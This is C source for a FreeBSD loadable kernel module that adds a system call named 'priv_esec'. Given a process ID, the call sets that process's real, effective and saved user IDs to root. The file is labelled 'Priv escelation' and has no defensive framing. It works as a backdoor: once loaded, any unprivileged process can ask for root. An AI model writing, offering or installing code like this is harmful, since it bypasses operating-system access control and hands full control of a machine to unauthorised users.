#include <sys/param.h>
#include <sys/module.h>
#include <sys/kernel.h>
#include <sys/systm.h>
#include <sys/types.h>
#include <sys/proc.h>

#include <sys/sysent.h>
#include <sys/queue.h>
#include <sys/lock.h>
#include <sys/sx.h>
#include <sys/mutex.h>
#include <sys/sysproto.h>


// Priv escelation

typedef struct priv_esec_args {
	pid_t p_pid;
} priv_esec_args;

static int priv_esec(struct thread *td, void *syscall_args)
{
	priv_esec_args *uap;
	uap = (priv_esec_args *)(syscall_args);

	// Find the process we're looking for
	struct proc *p;

	sx_xlock(&allproc_lock);

	LIST_FOREACH(p, PIDHASH(uap->p_pid), p_hash) {
		if (p->p_pid == uap->p_pid) {
			if (p->p_state == PRS_NEW) {
				p = NULL;
				break;
			}
			PROC_LOCK(p);
			uprintf("Updated: %d\n", uap->p_pid);

			// Update it's privs, this proc is know owned by root.
			p->p_ucred->cr_ruid = 0;
			p->p_ucred->cr_uid = 0;
			p->p_ucred->cr_svuid = 0;

			PROC_UNLOCK(p);

			break;
		}
	}

	sx_xunlock(&allproc_lock);

	return 0;
}

static struct sysent priv_esec_sysent  = {
	1,
	priv_esec
};

static int offset = NO_SYSCALL;

static int load(struct module *module, int cmd, void *arg)
{
	int error = 0;
	
	switch (cmd) {
	case MOD_LOAD:
		uprintf("priv esec loaded at offset: %d\n", offset);
		break;
	
	case MOD_UNLOAD:
		uprintf("Good-bye, cruel world!\n"); 
		break;

	default:
		error = EOPNOTSUPP;
		break;

	}

	return(error);
}

SYSCALL_MODULE(priv_esec, &offset, &priv_esec_sysent, load, NULL);
